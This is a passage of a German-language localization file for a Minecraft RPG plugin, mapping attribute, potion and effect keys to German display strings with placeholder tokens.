id,title,username,language,date,content
  ""attribute_fire_resistance"": ""%icon%%value% Feuerresistenz"",
  ""attribute_magic_resistance"": ""%icon%%value% Magieresistenz"",
  ""attribute_bleed_resistance"": ""%icon%%value% Blutungen-Resistenz"",
  ""attribute_stun_resistance"": ""%icon%%value% Betäubungsresistenz"",
  ""attribute_poison_resistance"": ""%icon%%value% Giftresistenz"",
  ""attribute_projectile_resistance"": ""%icon%%value% Projektilresistenz"",
  ""attribute_melee_resistance"": ""%icon%%value% Nahkampfresistenz"",
  ""attribute_bludgeoning_resistance"": ""%icon%%value% Stumpfresistenz"",
  ""attribute_lightning_resistance"": ""%icon%%value% Blitzresistenz"",
  ""attribute_freezing_resistance"": ""%icon%%value% Kälteresistenz"",
  ""attribute_radiant_resistance"": ""%icon%%value% Strahlungsresistenz"",
  ""attribute_necrotic_resistance"": ""%icon%%value% Nekrose-Resistenz"",
  ""attribute_crit_chance_resistance"": ""%icon%%value% Krit-Chance-Resistenz"",
  ""attribute_crit_damage_resistance"": ""%icon%%value% Krit-Schaden-Resistenz"",
  ""attribute_dodge_chance"": ""%icon%%value% Ausweichwahrscheinlichkeit"",
  ""attribute_healing_bonus"": ""%icon%%value% Heilung"",
  ""attribute_food_consumption"": ""%icon%%value% Nahrungsverbrauch"",
  ""attribute_cooldown_reduction"": ""%icon%%value% Abklingzeitverkürzung"",
  ""attribute_explosion_power"": ""%icon%%value% TNT-Kraft"",
  ""attribute_crafting_speed"": ""%icon%%value% Fertigungsgeschwindigkeit"",
  ""attribute_alchemy_quality"": ""%icon%%value% Alchemie-Fertigkeit"",
  ""attribute_alchemy_quality_fraction"": ""%icon%%value% Alchemie-Fertigkeit"",
  ""attribute_enchanting_quality"": ""%icon%%value% Verzauberungsfertigkeit"",
  ""attribute_enchanting_quality_fraction"": ""%icon%%value% Verzauberungsfertigkeit"",
  ""attribute_anvil_quality_flat"": ""%icon%%value% Amboss-Fertigkeit"",
  ""attribute_anvil_quality_fraction"": ""%icon%%value% Amboss-Fertigkeit"",
  ""attribute_brewing_ingredient_consumption"": ""%icon%%value% Brau-Zutatenverbrauch"",
  ""attribute_brewing_speed"": ""%icon%%value% Braugeschwindigkeit"",
  ""attribute_potion_consumption"": ""%icon%%value% Tränkeverbrauch"",
  ""attribute_throwing_velocity"": ""%icon%%value% Wurfgeschwindigkeit"",
  ""attribute_smithing_quality"": ""%icon%%value% Schmiedefertigkeit"",
  ""attribute_smithing_quality_fraction"": ""%icon%%value% Schmiedefertigkeit"",
  ""attribute_mining_rare_drops"": ""%icon%%value% Abbauglück"",
  ""attribute_mining_drops"": ""%icon%%value% Abbauausbeute"",
  ""attribute_woodcutting_rare_drops"": ""%icon%%value% Holzfällerglück"",
  ""attribute_woodcutting_drops"": ""%icon%%value% Holzfällerausbeute"",
  ""attribute_digging_rare_drops"": ""%icon%%value% Grabeglück"",
  ""attribute_digging_drops"": ""%icon%%value% Grabausbeute"",
  ""attribute_farming_rare_drops"": ""%icon%%value% Landwirtschaft-Glück"",
  ""attribute_farming_drops"": ""%icon%%value% Landwirtschaftsausbeute"",
  ""attribute_fishing_luck"": ""%icon%%value% Angel-Glück"",
  ""attribute_skill_exp_gain"": ""%icon%%value% Fertigkeiten-EP"",
  ""attribute_vanilla_exp_gain"": ""%icon%%value% Verzauberungserfahrungskugeln"",
  ""attribute_damage_taken"": ""%icon%%value% Erlittener Schaden"",
  ""attribute_reflect_chance"": ""%icon%%value% Reflexionswahrscheinlichkeit"",
  ""attribute_reflect_fraction"": ""%icon%%value% Reflexionsschaden"",
  ""attribute_generic_luck"": ""%icon%%value% Glück"",
  ""attribute_generic_armor"": ""%icon%%value% Rüstung"",
  ""attribute_generic_armor_toughness"": ""%icon%%value% Rüstungshärte"",
  ""attribute_generic_attack_damage"": ""%icon%%value% Angriffsstärke"",
  ""attribute_generic_attack_speed"": ""%icon%%value% Angriffsgeschwindigkeit"",
  ""attribute_generic_knockback_resistance"": ""%icon%%value% Rückstoßresistenz"",
  ""attribute_generic_max_health"": ""%icon%%value% Maximale Gesundheit"",
  ""attribute_generic_movement_speed"": ""%icon%%value% Bewegungsgeschwindigkeit"",
  ""attribute_sneak_movement_speed_bonus"": ""%icon%%value% Schleichgeschwindigkeit"",
  ""attribute_sprint_movement_speed_bonus"": ""%icon%%value% Renngeschwindigkeit"",
  ""attribute_damage_explosion"": ""%icon%%value% Explosionsschaden"",
  ""attribute_damage_fire"": ""%icon%%value% Feuerschaden"",
  ""attribute_damage_magic"": ""%icon%%value% Magieschaden"",
  ""attribute_damage_poison"": ""%icon%%value% Giftschaden"",
  ""attribute_damage_bludgeoning"": ""%icon%%value% Stumpfer Schaden"",
  ""attribute_damage_lightning"": ""%icon%%value% Blitzschaden"",
  ""attribute_damage_freezing"": ""%icon%%value% Frostschaden"",
  ""attribute_damage_radiant"": ""%icon%%value% Strahlenschaden"",
  ""attribute_damage_necrotic"": ""%icon%%value% Nekrose-Schaden"",
  ""attribute_extra_explosion_damage"": ""%icon%%value% Explosionsschaden"",
  ""attribute_extra_fire_damage"": ""%icon%%value% Feuerschaden"",
  ""attribute_extra_magic_damage"": ""%icon%%value% Magieschaden"",
  ""attribute_extra_poison_damage"": ""%icon%%value% Giftschaden"",
  ""attribute_extra_bludgeoning_damage"": ""%icon%%value% Stumpfer Schaden"",
  ""attribute_extra_lightning_damage"": ""%icon%%value% Blitzschaden"",
  ""attribute_extra_freezing_damage"": ""%icon%%value% Frostschaden"",
  ""attribute_extra_radiant_damage"": ""%icon%%value% Strahlenschaden"",
  ""attribute_extra_necrotic_damage"": ""%icon%%value% Nekrose-Schaden"",
  ""attribute_cooking_speed"": ""%icon%%value% Kochgeschwindigkeit"",
  ""attribute_jump_height"": ""%icon%%value% Sprungweite"",
  ""attribute_jumps"": ""%icon%%value% Mehrfachsprünge"",
  ""attribute_entity_drops"": ""%icon%%value% Mobs-Ausbeute"",
  ""attribute_light_armor"": ""%icon%%value% Leichte Rüstung"",
  ""attribute_heavy_armor"": ""%icon%%value% Schwere Rüstung"",
  ""attribute_lapis_save_chance"": ""%icon%%value% Lapiskonsumtion"",
  ""attribute_enchanting_refund_chance"": ""%icon%%value% Erfahrungskugel-Rückgabewahr-scheinlichkeit"",
  ""attribute_enchanting_refund_fraction"": ""%icon%%value% Rückgegebe-ne Erfahrungskugeln"",
  ""attribute_lingering_duration_multiplier"": ""%icon%%value% Nachhall-Dauer"",
  ""attribute_lingering_radius_multiplier"": ""%icon%%value% Nachhall-Reichweite"",
  ""attribute_splash_intensity_minimum"": ""%icon%%value% Spritz-Effizienz"",
  ""attribute_entity_rare_drops"": ""%icon%%value% Mobs-Schatz-Glück"",
  ""attribute_dig_speed"": ""%icon%%value% Abbaugeschwindigkeit"",
  ""attribute_mining_speed"": ""%icon%%value% Abbaugeschwindigkeit"",
  ""attribute_durability_multiplier"": ""%icon%%value% Haltbarkeit"",
  ""attribute_crossbow_magazine"": """",
  ""attribute_attack_reach_multiplier"": ""%icon%%value% Angriffsreichweite"",
  ""attribute_generic_scale"": ""%icon%%value% Größe"",
  ""attribute_generic_block_interaction_range"": ""%icon%%value% Reichweite"",
  ""attribute_generic_step_height"": ""%icon%%value% Schrittweite"",
  ""attribute_shield_disarming"": ""%icon%%value% Schildentwaffen"",
  ""attribute_life_steal"": ""%icon%%value% Lebensraub"",
  ""attribute_generic_gravity"": ""%icon%%value% Gravitation"",
  ""attribute_generic_safe_fall_distance"": ""%icon%%value% Fallhöhe"",
  ""attribute_generic_fall_damage_multiplier"": ""%icon%%value% Fallschaden"",
  ""stat_attribute_negative_prefix"": ""&c"",
  ""stat_attribute_positive_prefix"": ""&7"",
  
  ""potion_effect_charges_format"": ""&7(%prefix%%charges_numeric%x&7)"",
  ""potion_effect_display"": ""&7&lAktive Effekte"",
  ""combined_potion_name"": ""&d"",
  
  ""potion_name_heal"": ""Heilung"",
  ""potion_name_bad_omen"": ""Krieg"",
  ""potion_name_harm"": ""Schaden"",
  ""potion_name_saturation"": ""Sättigung"",
  ""potion_name_absorption"": ""Absorption"",
  ""potion_name_conduit_power"": ""Leitungsenergie"",
  ""potion_name_blindness"": ""Blindheit"",
  ""potion_name_darkness"": ""Abgrund"",
  ""potion_name_confusion"": ""Übelkeit"",
  ""potion_name_damage_resistance"": ""Schildkrötenmeister"",
  ""potion_name_fast_digging"": ""Eile"",
  ""potion_name_fire_resistance"": ""Feuerresistenz"",
  ""potion_name_glowing"": ""Leuchten"",
  ""potion_name_custom_health_boost"": ""Vitalität"",
  ""potion_name_health_boost"": ""Vitalität"",
  ""potion_name_hero_of_the_village"": ""Handeln"",
  ""potion_name_hunger"": ""Hunger"",
  ""potion_name_increase_damage"": ""Stärke"",
  ""potion_name_invisibility"": ""Unsichtbarkeit"",
  ""potion_name_jump"": ""Sprungkraft"",
  ""potion_name_levitation"": ""Levitation"",
  ""potion_name_luck"": ""Glück"",
  ""potion_name_poison"": ""Gift"",
  ""potion_name_regeneration"": ""Regeneration"",
  ""potion_name_slow"": ""Langsamkeit"",
  ""potion_name_slow_digging"": ""Müdigkeit"",
  ""potion_name_slow_falling"": ""Langsames Fallen"",
  ""potion_name_speed"": ""Geschwindigkeit"",
  ""potion_name_custom_speed"": ""Geschwindigkeit"",
  ""potion_name_unluck"": ""Pech"",
  ""potion_name_water_breathing"": ""Wasseratmung"",
  ""potion_name_weakness"": ""Schwäche"",
  ""potion_name_wither"": ""Verfall"",
  ""potion_name_night_vision"": ""Nachtsicht"",
  ""potion_name_bow_strength"": ""Kraft"",
  ""potion_name_arrow_damage"": ""Wucht"",
  ""potion_name_ammo_consumption"": ""Nachschub"",
  ""potion_name_arrow_velocity"": ""Bolzen"",
  ""potion_name_arrow_accuracy"": ""Präzision"",
  ""potion_name_arrow_piercing"": ""Durchdringung"",
  ""potion_name_knockback"": ""Rückstoß"",
  ""potion_name_stun_chance"": ""Betäubung"",
  ""potion_name_bleed_chance"": ""Blutung"",
  ""potion_name_bleed_damage"": ""Blutung"",
  ""potion_name_bleed_duration"": ""Blutung"",
  ""potion_name_crit_chance"": ""Fokus"",
  ""potion_name_crit_damage"": ""Fokus"",
  ""potion_name_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_light_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_heavy_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_light_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_heavy_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_heavy_armor_damage"": ""Ritterbann"",
  ""potion_name_light_armor_damage"": ""Assassinenbann"",
  ""potion_name_immunity_bonus_fraction"": ""Göttlicher Schutz"",
  ""potion_name_immunity_bonus_flat"": ""Göttlicher Schutz"",
  ""potion_name_immunity_reduction"": ""Ketzerei"",
  ""potion_name_damage_unarmed"": ""Rauferei"",
  ""potion_name_damage_melee"": ""Duell"",
  ""potion_name_damage_ranged"": ""Scharfschützentum"",
  ""potion_name_damage_all"": ""Liquidation"",
  ""potion_name_attack_reach"": ""Reichweite"",
  ""potion_name_velocity_damage"": ""Stoß"",
  ""potion_name_dismount_chance"": ""Abwurf"",
  ""potion_name_custom_damage_resistance"": ""Ambrosia"",
  ""potion_name_explosion_resistance"": ""Explosionsresistenz"",
  ""potion_name_fall_damage_resistance"": ""Fallresistenz"",
  ""potion_name_custom_fire_resistance"": ""Feuerresistenz"",
  ""potion_name_magic_resistance"": ""Magieresistenz"",
  ""potion_name_bludgeoning_resistance"": ""Kraftresistenz"",
  ""potion_name_lightning_resistance"": ""Blitzresistenz"",
  ""potion_name_freezing_resistance"": ""Frostresistenz"",
  ""potion_name_radiant_resistance"": ""Strahlungsresistenz"",
  ""potion_name_necrotic_resistance"": ""Nekroseresistenz"",
  ""potion_name_crit_chance_resistance"": ""Achtsamkeit"",
  ""potion_name_crit_damage_resistance"": ""Abprallung"",
  ""potion_name_bleed_resistance"": ""Wundheilung"",
  ""potion_name_stun_resistance"": ""Stabilität"",
  ""potion_name_poison_resistance"": ""Gegenmittel"",
  ""potion_name_projectile_resistance"": ""Projektilresistenz"",
  ""potion_name_melee_resistance"": ""Nahkampfresistenz"",
  ""potion_name_dodge_chance"": ""Ausweichen"",
  ""potion_name_healing_bonus"": ""Wiederherstellung"",
  ""potion_name_food_consumption"": ""Sättigung"",
  ""potion_name_cooldown_reduction"": ""Ehrgeiz"",
  ""potion_name_explosion_power"": ""Zerstörung"",
  ""potion_name_crafting_speed"": ""Produktivität"",
  ""potion_name_alchemy_quality"": ""Alchemie"",
  ""potion_name_alchemy_quality_fraction"": ""Alchemie"",
  ""potion_name_enchanting_quality"": ""Verzauberung"",
  ""potion_name_enchanting_quality_fraction"": ""Verzauberung"",
  ""potion_name_anvil_quality_flat"": ""Verzauberung"",
  ""potion_name_anvil_quality_fraction"": ""Verzauberung"",
  ""potion_name_brewing_ingredient_consumption"": """",
  ""potion_name_smithing_quality"": ""Schmiedekunst"",
  ""potion_name_smithing_quality_fraction"": ""Schmiedekunst"",
  ""potion_name_brewing_speed"": ""Reaktivität"",
  ""potion_name_potion_consumption"": ""Flaschen Füllen"",
  ""potion_name_throwing_velocity"": ""Werfen"",
  ""potion_name_mining_rare_drops"": ""Schatz"",
  ""potion_name_mining_drops"": ""Schatz"",
  ""potion_name_woodcutting_rare_drops"": ""Abholzen"",
  ""potion_name_woodcutting_drops"": ""Abholzen"",
  ""potion_name_digging_rare_drops"": ""Archäologie"",
  ""potion_name_digging_drops"": ""Archäologie"",
  ""potion_name_farming_rare_drops"": ""Landwirtschaft"",
  ""potion_name_farming_drops"": ""Landwirtschaft"",
  ""potion_name_fishing_luck"": ""Schatz"",
  ""potion_name_skill_exp_gain"": ""Lernen"",
  ""potion_name_vanilla_exp_gain"": ""Aussaugen"",
  ""potion_name_damage_taken"": ""Verletzlichkeit"",
  ""potion_name_reflect_chance"": ""Reflexion"",
  ""potion_name_reflect_fraction"": ""Reflexion"",
  ""potion_name_custom_luck"": ""Glück"",
  ""potion_name_armor_flat"": ""Rüstung"",
  ""potion_name_armor_fraction"": ""Rüstung"",
  ""potion_name_armor_toughness_flat"": ""Härte"",
  ""potion_name_armor_toughness_fraction"": ""Härte"",
  ""potion_name_attack_speed"": ""Klingen"",
  ""potion_name_knockback_resistance"": ""Standfestigkeit"",
  ""potion_name_max_health_flat"": ""Vitalität"",
  ""potion_name_max_health_fraction"": ""Vitalität"",
  ""potion_name_movement_speed"": ""Geschwindigkeit"",
  ""potion_name_smithing_masterpiece_flat"": ""Meisterwerk"",
  ""potion_name_smithing_masterpiece_fraction"": ""Meisterwerk"",
  ""potion_name_enchanting_masterpiece_flat"": ""Arkanwissen"",
  ""potion_name_enchanting_masterpiece_fraction"": ""Arkanwissen"",
  ""potion_name_alchemy_masterpiece_flat"": ""Magnum Opus"",
  ""potion_name_alchemy_masterpiece_fraction"": ""Magnum Opus"",
  ""potion_name_damage_explosion"": ""Explosionsaspekt"",
  ""potion_name_damage_fire"": ""Feueraspekt"",
  ""potion_name_damage_magic"": ""Magie-Aspekt"",
  ""potion_name_damage_poison"": ""Giftaspekt"",
  ""potion_name_damage_bludgeoning"": ""Kraftaspekt"",
  ""potion_name_damage_lightning"": ""Blitzaspekt"",
  ""potion_name_damage_freezing"": ""Frostaspekt"",
  ""potion_name_damage_radiant"": ""Strahlungsaspekt"",
  ""potion_name_damage_necrotic"": ""Nekrose-Aspekt"",
  ""potion_name_extra_explosion_damage"": ""Explosionsaspekt"",
  ""potion_name_extra_fire_damage"": ""Feueraspekt"",
  ""potion_name_extra_magic_damage"": ""Magie-Aspekt"",
  ""potion_name_extra_poison_damage"": ""Giftaspekt"",
  ""potion_name_extra_bludgeoning_damage"": ""Kraftaspekt"",
  ""potion_name_extra_lightning_damage"": ""Blitzaspekt"",
  ""potion_name_extra_freezing_damage"": ""Frostaspekt"",
  ""potion_name_extra_radiant_damage"": ""Strahlungsaspekt"",
  ""potion_name_extra_necrotic_damage"": ""Nekrose-Aspekt"",
  ""potion_name_extra_attack_damage"": ""Stärke"",
  ""potion_name_cooking_speed"": ""Hochflammend"",
  ""potion_name_sneak_movement_speed_bonus"": ""Flinkes Schleichen"",
  ""potion_name_sprint_movement_speed_bonus"": ""Rennen"",
  ""potion_name_stun"": ""Betäubung"",
  ""potion_name_fire"": ""Napalm"",
  ""potion_name_jumps"": ""Luftsprünge"",
  ""potion_name_jump_height"": ""Springen"",
  ""potion_name_durability_multiplier"": ""Beständigkeit"",
  ""potion_name_light_armor"": ""Lederhaut"",
  ""potion_name_heavy_armor"": ""Eisenhaut"",
  ""potion_name_entity_drops"": ""Plünderung"",
  ""potion_name_instant_explosion_damage"":""Explosion"",
  ""potion_name_instant_fire_damage"": ""Napalm"",
  ""potion_name_instant_poison_damage"": ""Virulenz"",
  ""potion_name_instant_magic_damage"": ""Zauberei"",
  ""potion_name_instant_melee_damage"": ""Abgehärtete Klinge"",
  ""potion_name_instant_projectile_damage"": ""Abgehärteter Bolzen"",
  ""potion_name_instant_bludgeoning_damage"": ""Abgehärtete Härte"",
  ""potion_name_instant_lightning_damage"": ""Schock"",
  ""potion_name_instant_freezing_damage"": ""Frost"",
  ""potion_name_instant_radiant_damage"": ""Weihwasser"",
  ""potion_name_instant_necrotic_damage"": ""Verfluchtes Wasser"",
  ""potion_name_bleed"": ""Ruinierung"",
  ""potion_name_recall"": ""Rückruf"",
  ""potion_name_antibleed"": ""Versiegelung"",
  ""potion_name_custom_heal"": ""Heilung"",
  ""potion_name_lapis_save_chance"": ""Verzauberung"",
  ""potion_name_enchanting_refund_chance"": ""Verzauberung"",
  ""potion_name_enchanting_refund_fraction"": ""Verzauberung"",
  ""potion_name_lingering_duration_multiplier"": ""Alchemie"",
  ""potion_name_lingering_radius_multiplier"": ""Alchemie"",
  ""potion_name_splash_intensity_minimum"": ""Alchemie"",
  ""potion_name_entity_rare_drops"": ""Plünderung"",
  ""potion_name_dig_speed"": ""Bohrung"",
  ""potion_name_crossbow_magazine"": ""Bogenschießen"",
  ""potion_name_attack_reach_multiplier"": ""Reichweite"",
  ""potion_name_generic_scale"": ""Riesen"",
  ""potion_name_generic_block_interaction_range"": ""Reichweite"",
  ""potion_name_generic_step_height"": ""Schreiten"",
  ""potion_name_shield_disarming"": ""Zerbrechen"",
  ""potion_name_life_steal"": ""Vampirismus"",
  ""potion_name_generic_gravity"": ""Masse"",
  ""potion_name_generic_safe_fall_distance"": ""Kapazität"",
  ""potion_name_generic_fall_damage_multiplier"": ""Schaden"",
  ""potion_name_chocolate_milk"": ""Schokomilch"",
  ""potion_name_milk"": ""Milch"",
  ""effect_name_heal"": ""%icon% Sofortige Heilung %value%"",
  ""effect_name_bad_omen"": ""%icon% Schlechtes Omen %value% %duration%"",
  ""effect_name_harm"": ""%icon% Sofortiger Schaden %value%"",
  ""effect_name_saturation"": ""%icon% Sättigung %value%"",
  ""effect_name_absorption"": ""%icon% Absorption %value% %duration%"",
  ""effect_name_conduit_power"": ""%icon% Leitungsenergie %duration%"",
  ""effect_name_blindness"": ""%icon% Blindheit %duration%"",
  ""effect_name_darkness"": ""%icon% Dunkelheit %duration%"",
  ""effect_name_dolphins_grace"": ""%icon% Delphin-Anmut %duration%"",
  ""effect_name_confusion"": ""%icon% Übelkeit %duration%"",
  ""effect_name_damage_resistance"": ""%icon% Resistenz %value% %duration%"",
  ""effect_name_fast_digging"": ""%icon% Eile %value% %duration%"",
  ""effect_name_fire_resistance"": ""%icon% Feuerresistenz %duration%"",
  ""effect_name_glowing"": ""%icon% Leuchten %duration%"",
  ""effect_name_health_boost"": ""%icon% Vitalitätsboost %value% %duration%"",
  ""effect_name_hero_of_the_village"": ""%icon% Dorfheld %value% %duration%"",
  ""effect_name_hunger"": ""%icon% Hunger %value% %duration%"",
  ""effect_name_increase_damage"": ""%icon% Stärke %value% %duration%"",
  ""effect_name_invisibility"": ""%icon% Unsichtbarkeit %duration%"",
  ""effect_name_jump"": ""%icon% Sprungkraft %value% %duration%"",
  ""effect_name_levitation"": ""%icon% Levitation %value% %duration%"",
  ""effect_name_luck"": ""%icon% Glück %value% %duration%"",
  ""effect_name_poison"": ""%icon% Gift %value% %duration%"",
  ""effect_name_regeneration"": ""%icon% Regeneration %value% %duration%"",
  ""effect_name_slow"": ""%icon% Verlangsamung %value% %duration%"",
  ""effect_name_slow_digging"": ""%icon% Müdigkeit %value% %duration%"",
  ""effect_name_slow_falling"": ""%icon% Langsames Fallen %duration%"",
  ""effect_name_speed"": ""%icon% Geschwindigkeit %value% %duration%"",
  ""effect_name_unluck"": ""%icon% Pech %value% %duration%"",
  ""effect_name_water_breathing"": ""%icon% Wasseratmung %duration%"",
  ""effect_name_weakness"": ""%icon% Schwäche %value% %duration%"",
  ""effect_name_wither"": ""%icon% Verfall %value% %duration%"",
  ""effect_name_night_vision"": ""%icon% Nachtsicht %duration%"",
  ""effect_name_bow_strength"": ""%icon% Bogenkraft %value% %duration%"",
  ""effect_name_arrow_damage"": ""%icon% Pfeilschaden %value% %duration%"",
  ""effect_name_ammo_consumption"": ""%icon% Munitionsverbrauch %value% %duration%"",
  ""effect_name_arrow_velocity"": ""%icon% Pfeilgeschwindigkeit %value% %duration%"",
  ""effect_name_arrow_accuracy"": ""%icon% Genauigkeit %value% %duration%"",
  ""effect_name_arrow_piercing"": ""%icon% Durchschlagskraft %value% %duration%"",
  ""effect_name_knockback"": ""%icon% Rückstoß %value% %duration%"",
  ""effect_name_stun_chance"": ""%icon% Betäubungswahrscheinlichkeit %value% %duration%"",
  ""effect_name_bleed_chance"": ""%icon% Blutverlust-Chance %value% %duration%"",
  ""effect_name_bleed_damage"": ""%icon% Blutverlust-Schaden %value% %duration%"",
  ""effect_name_bleed_duration"": ""%icon% Blutverlust-Dauer %value% %duration%"",
  ""effect_name_crit_chance"": ""%icon% Krit-Chance %value% %duration%"",
  ""effect_name_crit_damage"": ""%icon% Krit-Schaden %value% %duration%"",
  ""effect_name_armor_penetration_flat"": ""%icon% Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_light_armor_penetration_flat"": ""%icon% Leichte Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_penetration_flat"": ""%icon% Schwere Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_armor_penetration_fraction"": ""%icon% Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_light_armor_penetration_fraction"": ""%icon% Leichte Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_penetration_fraction"": ""%icon% Schwere Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_damage"": ""%icon% Schwere Rüstungsschaden %value% %duration%"",
  ""effect_name_light_armor_damage"": ""%icon% Leichte Rüstungsschaden %value% %duration%"",
  ""effect_name_immunity_bonus_fraction"": ""%icon% Immunität %value% %duration%"",
  ""effect_name_immunity_bonus_flat"": ""%icon% Immunität %value% %duration%"",
  ""effect_name_immunity_reduction"": ""%icon% Immunitätsreduktion %value% %duration%"",
  ""effect_name_damage_unarmed"": ""%icon% Unbewaffneter Schaden %value% %duration%"",
  ""effect_name_damage_melee"": ""%icon% Nahkampfschaden %value% %duration%"",
  ""effect_name_damage_ranged"": ""%icon% Fernkampfschaden %value% %duration%"",
  ""effect_name_damage_all"": ""%icon% Schaden %value% %duration%"",
  ""effect_name_attack_reach"": ""%icon% Angriffsreichweite %value% %duration%"",
  ""effect_name_velocity_damage"": ""%icon% Stoßschaden %value% %duration%"",
  ""effect_name_dismount_chance"": ""%icon% Abwurf-Chance %value% %duration%"",
  ""effect_name_custom_damage_resistance"": ""%icon% Schadensresistenz %value% %duration%"",
  ""effect_name_explosion_resistance"": ""%icon% Explosionsresistenz %value% %duration%"",
  ""effect_name_fall_damage_resistance"": ""%icon% Fallschadenresistenz %value% %duration%"",
  ""effect_name_custom_fire_resistance"": ""%icon% Feuerresistenz %value% %duration%"",
  ""effect_name_magic_resistance"": ""%icon% Magieresistenz %value% %duration%"",
  ""effect_name_bludgeoning_resistance"": ""%icon% Stumpf-Resistenz %value% %duration%"",
  ""effect_name_lightning_resistance"": ""%icon% Blitzresistenz %value% %duration%"",
  ""effect_name_freezing_resistance"": ""%icon% Frostresistenz %value% %duration%"",
  ""effect_name_radiant_resistance"": ""%icon% Strahlungsresistenz %value% %duration%"",
  ""effect_name_necrotic_resistance"": ""%icon% Nekrose-Resistenz %value% %duration%"",
  ""effect_name_crit_chance_resistance"": ""%icon% Krit-Chance-Resistenz %value% %duration%"",
  ""effect_name_crit_damage_resistance"": ""%icon% Krit-Schaden-Resistenz %value% %duration%"",
  ""effect_name_bleed_resistance"": ""%icon% Blutungen-Resistenz %value% %duration%"",
  ""effect_name_stun_resistance"": ""%icon% Betäubungsresistenz %value% %duration%"",
  ""effect_name_poison_resistance"": ""%icon% Giftresistenz %value% %duration%"",
  ""effect_name_projectile_resistance"": ""%icon% Projektilresistenz %value% %duration%"",
  ""effect_name_melee_resistance"": ""%icon% Nahkampfresistenz %value% %duration%"",
  ""effect_name_dodge_chance"": ""%icon% Ausweichwahrscheinlichkeit %value% %duration%"",
  ""effect_name_healing_bonus"": ""%icon% Heilung %value% %duration%"",
  ""effect_name_food_consumption"": ""%icon% Hungerverbrauch %value% %duration%"",
  ""effect_name_cooldown_reduction"": ""%icon% Abklingzeitverkürzung %value% %duration%"",
  ""effect_name_explosion_power"": ""%icon% Explosionskraft %value% %duration%"",
  ""effect_name_crafting_speed"": ""%icon% Fertigungsgeschwindigkeit %value% %duration%"",
  ""effect_name_alchemy_quality"": ""%icon% Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_alchemy_quality_fraction"": ""%icon% Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_enchanting_quality"": ""%icon% Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_enchanting_quality_fraction"": ""%icon% Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_anvil_quality_flat"": ""%icon% Amboss-Fertigkeit %value% %duration%"",
  ""effect_name_anvil_quality_fraction"": ""%icon% Amboss-Fertigkeit %value% %duration%"",
  ""effect_name_smithing_quality"": ""%icon% Schmiedekunst %value% %duration%"",
  ""effect_name_smithing_quality_fraction"": ""%icon% Schmiedekunst %value% %duration%"",
  ""effect_name_brewing_ingredient_consumption"": ""%icon% Brau-Zutatenverbrauch %value% %duration%"",
  ""effect_name_brewing_speed"": ""%icon% Braugeschwindigkeit %value% %duration%"",
  ""effect_name_potion_consumption"": ""%icon% Tränkeverbrauch %value% %duration%"",
  ""effect_name_throwing_velocity"": ""%icon% Wurfreichweite %value% %duration%"",
  ""effect_name_mining_rare_drops"": ""%icon% Abbau-Glück %value% %duration%"",
  ""effect_name_mining_drops"": ""%icon% Abbauausbeute %value% %duration%"",
  ""effect_name_woodcutting_rare_drops"": ""%icon% Holzfällerer-Glück %value% %duration%"",
  ""effect_name_woodcutting_drops"": ""%icon% Holzfällerausbeute %value% %duration%"",
  ""effect_name_digging_rare_drops"": ""%icon% Grabe-Glück %value% %duration%"",
  ""effect_name_digging_drops"": ""%icon% Grabausbeute %value% %duration%"",
  ""effect_name_farming_rare_drops"": ""%icon% Landwirtschaft-Glück %value% %duration%"",
  ""effect_name_farming_drops"": ""%icon% Landwirtschaftsausbeute %value% %duration%"",
  ""effect_name_fishing_luck"": ""%icon% Angel-Glück %value% %duration%"",
  ""effect_name_skill_exp_gain"": ""%icon% Fertigkeiten-EP %value% %duration%"",
  ""effect_name_vanilla_exp_gain"": ""%icon% Verzauberungserfahrungskugeln %value% %duration%"",
  ""effect_name_damage_taken"": ""%icon% Erlittener Schaden %value% %duration%"",
